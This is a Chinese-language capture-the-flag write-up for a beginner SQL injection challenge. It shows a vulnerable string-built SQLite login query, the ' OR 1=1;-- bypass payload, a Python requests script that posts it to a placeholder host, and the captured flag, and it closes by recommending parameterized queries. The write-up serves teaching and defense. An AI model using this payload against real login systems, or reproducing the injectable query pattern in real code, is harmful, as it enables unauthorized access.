# baby_sqli

## 题目简述

Flask 登录接口把用户提交的用户名和密码直接插入 SQLite 查询：

```python
query = (
    "SELECT id, username FROM users "
    f"WHERE username = '{username}' AND password = '{password}'"
)
```

数据库中只有一个用户名为 `admin` 的账户。查询返回记录后，程序把第一条结果的用户名写入 Session；只有该值为 `admin` 才能进入显示 Flag 的 Dashboard。

## 解题过程

用户名保持为 `admin`，密码提交：

```text
' OR 1=1;--
```

拼接后的语句近似为：

```sql
SELECT id, username FROM users
WHERE username = 'admin' AND password = '' OR 1=1;--'
```

`OR 1=1` 使条件恒真，`--` 注释掉末尾引号。查询返回 `admin` 记录，应用随后设置管理员 Session 并跳转 `/dashboard`：

```python
import requests

s = requests.Session()
s.post(
    "http://HOST/login",
    data={"username": "admin", "password": "' OR 1=1;--"},
)
print(s.get("http://HOST/dashboard").text)
```

页面中得到：

```text
greyhats{B4by_5qL1_1s_e4sy_4nd_fUn}
```

## 方法总结

- 核心技巧：通过恒真条件和行注释绕过字符串拼接的 SQLite 登录查询。
- 识别信号：f-string/字符串格式化直接构造 SQL，用户名和密码均被单引号包裹。
- 复用要点：必须让查询返回的首条记录确实是管理员；防守侧应使用参数化查询，而不是过滤引号或关键字。
